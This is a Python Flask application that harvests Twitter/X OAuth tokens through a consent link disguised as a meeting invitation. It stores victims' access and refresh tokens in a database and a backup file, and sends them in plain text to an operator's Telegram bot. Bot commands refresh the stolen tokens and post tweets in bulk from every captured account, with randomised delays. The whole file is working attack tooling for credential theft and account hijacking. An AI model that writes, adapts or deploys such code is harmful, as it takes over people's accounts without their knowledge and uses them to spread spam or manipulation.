import base64
import hashlib
import os
import psycopg2
import requests
import time
import json
import random
from flask import Flask, redirect, request, session, render_template, url_for
from psycopg2.extras import RealDictCursor

# Configuration: Ensure these environment variables are set correctly
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')
DATABASE_URL = os.getenv('DATABASE_URL')  # Render PostgreSQL URL

# Set default delay values from environment variables
DEFAULT_MIN_DELAY = int(os.getenv("BULK_POST_MIN_DELAY", 2))
DEFAULT_MAX_DELAY = int(os.getenv("BULK_POST_MAX_DELAY", 10))

app = Flask(__name__)
app.secret_key = os.urandom(24)
BACKUP_FILE = 'tokens_backup.txt'

# Initialize PostgreSQL database
def init_db():
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (
            id SERIAL PRIMARY KEY,
            access_token TEXT NOT NULL,
            refresh_token TEXT,
            username TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()  # Ensure the database is initialized when the app starts

def store_token(access_token, refresh_token, username):
    print("Storing token in the database...")
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO tokens (access_token, refresh_token, username)
            VALUES (%s, %s, %s)
        ''', (access_token, refresh_token, username))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Database error while storing token: {e}")

    # Fetch and backup all tokens
    backup_data = get_all_tokens()
    formatted_backup_data = [{'access_token': a, 'refresh_token': r, 'username': u} for a, r, u in backup_data]
    
    try:
        with open(BACKUP_FILE, 'w') as f:
            json.dump(formatted_backup_data, f, indent=4)
        print(f"Backup created/updated in {BACKUP_FILE}. Total tokens: {len(backup_data)}")
    except IOError as e:
        print(f"Error writing to backup file: {e}")

    # Notify Telegram
    send_message_via_telegram(f"💾 Backup updated! Token added for @{username}.\n📊 Total tokens in backup: {len(backup_data)}")

def restore_from_backup():
    print("Restoring from backup if database is empty...")
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM tokens')
        count = cursor.fetchone()[0]
        conn.close()
    except Exception as e:
        print(f"Database error during restore check: {e}")
        return

    if count == 0:
        if os.path.exists(BACKUP_FILE):
            try:
                with open(BACKUP_FILE, 'r') as f:
                    backup_data = json.load(f)
                    if not isinstance(backup_data, list):
                        raise ValueError("Invalid format in backup file.")
            except (json.JSONDecodeError, ValueError, IOError) as e:
                print(f"Error reading backup file: {e}")
                return

            restored_count = 0
            for token_data in backup_data:
                access_token = token_data['access_token']
                refresh_token = token_data.get('refresh_token', None)
                username = token_data['username']

                try:
                    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
                    cursor = conn.cursor()
                    cursor.execute('''
                        INSERT INTO tokens (access_token, refresh_token, username)
                        VALUES (%s, %s, %s)
                    ''', (access_token, refresh_token, username))
                    conn.commit()
                    conn.close()
                    restored_count += 1
                except Exception as e:
                    print(f"Error restoring token for {username}: {e}")

            send_message_via_telegram(
                f"📂 Backup restored successfully!\n📊 Total tokens restored: {restored_count}"
            )
            print(f"Database restored from backup. Total tokens restored: {restored_count}")
        else:
            print("No backup file found. Skipping restoration.")

def get_all_tokens():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('SELECT access_token, refresh_token, username FROM tokens')
        tokens = cursor.fetchall()
        conn.close()
        return tokens
    except Exception as e:
        print(f"Error retrieving tokens from database: {e}")
        return []

def get_total_tokens():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM tokens')
        total = cursor.fetchone()[0]
        conn.close()
        return total
    except Exception as e:
        print(f"Error counting tokens in database: {e}")
        return 0

# Generate code verifier and challenge
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Function to send a startup message with OAuth link and meeting link
def send_startup_message():
    state = "0"  # Fixed state value for initialization
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

# Send message via Telegram
def send_message_via_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    headers = {"Content-Type": "application/json; charset=utf-8"}
    response = requests.post(url, json=data, headers=headers)
    if response.status_code != 200:
        print(f"Failed to send message via Telegram: {response.text}")

# Function to post a tweet using a single token
def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {"text": tweet_text}
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

# Refresh a token using refresh_token and notify via Telegram
def refresh_token_in_db(refresh_token, username):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    headers = {'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'refresh_token': refresh_token, 'grant_type': 'refresh_token', 'client_id': CLIENT_ID}
    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('UPDATE tokens SET access_token = %s, refresh_token = %s WHERE username = %s', 
                       (new_access_token, new_refresh_token, username))
        conn.commit()
        conn.close()
        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
        return new_access_token, new_refresh_token
    else:
        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
        return None, None
		
def get_twitter_username_and_profile(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json().get("data", {})
        username = data.get("username")
        profile_url = f"https://twitter.com/{username}" if username else None
        return username, profile_url
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None, None


# Function to post a tweet using a single token
def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {
        "text": tweet_text
    }
    
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

# Handle posting a tweet with a single token
def handle_post_single(tweet_text):
    tokens = get_all_tokens()
    if tokens:
        access_token, _, username = tokens[0]  # Post using the first token
        result = post_tweet(access_token, tweet_text)
        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
    else:
        send_message_via_telegram("❌ No tokens found to post a tweet.")

def handle_post_bulk(message):
    tokens = get_all_tokens()
    
    # Ensure the command format is correct
    parts = message.split(' ', 1)
    if len(parts) < 2:
        send_message_via_telegram("❌ Incorrect format. Use `/post_bulk <tweet content>`.")
        print("Error: Incorrect format for /post_bulk command.")
        return

    tweet_text = parts[1]
    min_delay = DEFAULT_MIN_DELAY
    max_delay = DEFAULT_MAX_DELAY

    print(f"Using delay range from environment: min_delay = {min_delay}, max_delay = {max_delay}")  # Debugging log
    
    if not tokens:
        send_message_via_telegram("❌ No tokens found to post tweets.")
        print("Error: No tokens available in the database.")
        return
    
    # Posting tweets with random delay between min_delay and max_delay
    for access_token, _, username in tokens:
        result = post_tweet(access_token, tweet_text)
        delay = random.randint(min_delay, max_delay)
        
        # Log and notify the posting result
        print(f"Tweet posted by @{username}. Result: {result}. Delay before next post: {delay} seconds.")  # Debugging log
        send_message_via_telegram(
            f"📝 Tweet posted with @{username}: {result}\n"
            f"⏱ Delay before next post: {delay} seconds."
        )
        
        # Apply the delay
        time.sleep(delay)
        
    # Final summary message after all tweets are posted
    send_message_via_telegram(f"✅ Bulk tweet posting complete. {len(tokens)} tweets posted.")
    print(f"Bulk tweet posting complete. {len(tokens)} tweets posted.")  # Debugging log
    
# Function to handle single token refresh
def handle_refresh_single():
    tokens = get_all_tokens()
    if tokens:
        _, token_refresh, username = tokens[0]  # Use the first token
        refresh_token_in_db(token_refresh, username)
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

# Function to handle bulk token refresh
def handle_refresh_bulk():
    tokens = get_all_tokens()
    if tokens:
        for _, refresh_token, username in tokens:
            refresh_token_in_db(refresh_token, username)
        send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

# Telegram bot webhook to listen for commands
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        handle_refresh_single()
    elif message == '/refresh_bulk':
        handle_refresh_bulk()
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    else:
        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, or /post_bulk <tweet>.")

    return '', 200

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)

    return render_template('tweet_form.html', access_token=access_token)

@app.route('/refresh/<refresh_token2>', methods=['GET'])
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
def perform_refresh(refresh_token):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    
    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': CLIENT_ID
    }

    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')

        # Use `get_twitter_username_and_profile` to fetch both username and profile URL
        username, profile_url = get_twitter_username_and_profile(new_access_token)

        if username:
            # Store the new tokens in the database
            store_token(new_access_token, new_refresh_token, username)
            
            # Notify via Telegram, including the profile URL
            send_message_via_telegram(f"New Access Token: {new_access_token}\n"
                                      f"New Refresh Token: {new_refresh_token}\n"
                                      f"Username: @{username}\n"
                                      f"Profile URL: {profile_url}")
            return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
        else:
            return "Error retrieving user info with the new access token", 400
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code


@app.route('/j')
def meeting():
    state_id = request.args.get('meeting')  # Get the 'meeting' parameter from the URL
    code_ch = request.args.get('pwd')  # Get the 'pwd' parameter from the URL
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
		
@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if not code:
        state = "0"  # Use a fixed state value
        session['oauth_state'] = state

        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier  # Store code_verifier in the session

        # Redirect the user to Twitter’s authorization page
        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    # Handling authorization response
    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != "0":  # Validate the state
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)

        # Exchange authorization code for tokens
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')

            # Fetch username and profile URL
            username, profile_url = get_twitter_username_and_profile(access_token)

            # Store tokens and username in the PostgreSQL database
            if username:
                store_token(access_token, refresh_token, username)

                # Retrieve total token count for notification
                total_tokens = get_total_tokens()

                # Notify via Telegram with details
                send_message_via_telegram(
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"🔗 Profile URL: {profile_url}\n"
                    f"📊 Total Tokens in Database: {total_tokens}"
                )

                # Redirect to active.html after saving and notifying
                return redirect(url_for('active'))
            else:
                return "Error retrieving user info with access token", 400
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            error_code = token_response.get('error', 'No error code')
            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

# Route to display active.html
@app.route('/active')
def active():
    username = session.get('username', 'User')
    return render_template('active.html', username=username)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()
    restore_from_backup()
    app.run(host='0.0.0.0', port=port)
